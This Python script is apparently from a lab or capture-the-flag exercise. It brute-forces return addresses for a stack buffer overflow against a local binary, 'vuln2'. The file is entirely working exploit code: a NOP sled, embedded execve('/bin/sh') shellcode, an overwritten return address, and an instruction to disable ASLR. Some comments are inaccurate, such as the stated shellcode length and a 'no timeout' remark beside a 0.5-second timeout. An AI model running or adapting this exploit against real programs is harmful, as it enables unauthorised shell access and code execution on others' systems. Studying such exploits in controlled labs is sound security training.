#!/usr/bin/python3
"""
Brute-force buffer overflow exploit
Tests addresses around 0x7fffffffe548 with 200-byte NOP sled
If you get a shell, STOP and use that address in exploit.py
"""

import subprocess
import struct
import sys
import time

# Base address from gdb
BASE_ADDR = 0x7fffffffe548

# 64-bit shellcode: execve("/bin/sh", NULL, NULL) - 27 bytes
shellcode = (
    b"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2"
    b"\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
    b"\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
)

OFFSET_TO_RET = 508  # 500 buffer + 8 saved RBP
NOP = b"\x90"
NOP_SLED_SIZE = 200

print("=" * 70)
print("BRUTE FORCE - Testing addresses with 200-byte NOP sled")
print("=" * 70)
print("\n[*] If you get a # or $ prompt, you have a shell!")
print("[*] Note the address and update exploit.py")
print("[*] Press Ctrl+C to stop and try the working address\n")
print("=" * 70)

# Test offsets from -64 to +256 in steps of 8
for offset in range(-64, 257, 8):
    buffer_addr = BASE_ADDR + offset
    return_addr = buffer_addr + 100  # Middle of NOP sled
    
    payload = NOP * NOP_SLED_SIZE
    payload += shellcode
    payload += b"A" * (OFFSET_TO_RET - len(payload))
    payload += struct.pack("<Q", return_addr)
    
    sys.stdout.write(f"\r[*] Trying offset {offset:+4d}: 0x{buffer_addr:016x} -> 0x{return_addr:016x}")
    sys.stdout.flush()
    
    try:
        # Run without timeout so shell stays open if it works
        subprocess.run(["./vuln2"], input=payload, timeout=0.5)
    except subprocess.TimeoutExpired:
        # If it times out, it might be waiting for shell input
        print(f"\n\n[!] HIT at offset {offset:+4d}! 0x{buffer_addr:016x}")
        print("[!] A shell might be open in another process")
        print("[!] Check your terminal for a # or $ prompt")
        sys.exit(0)
    except Exception:
        pass

print("\n\n[!] No shell found in tested range")
print("[!] Try wider range or check ASLR is disabled")
print("[!] Run: sudo sysctl -w kernel.randomize_va_space=0")
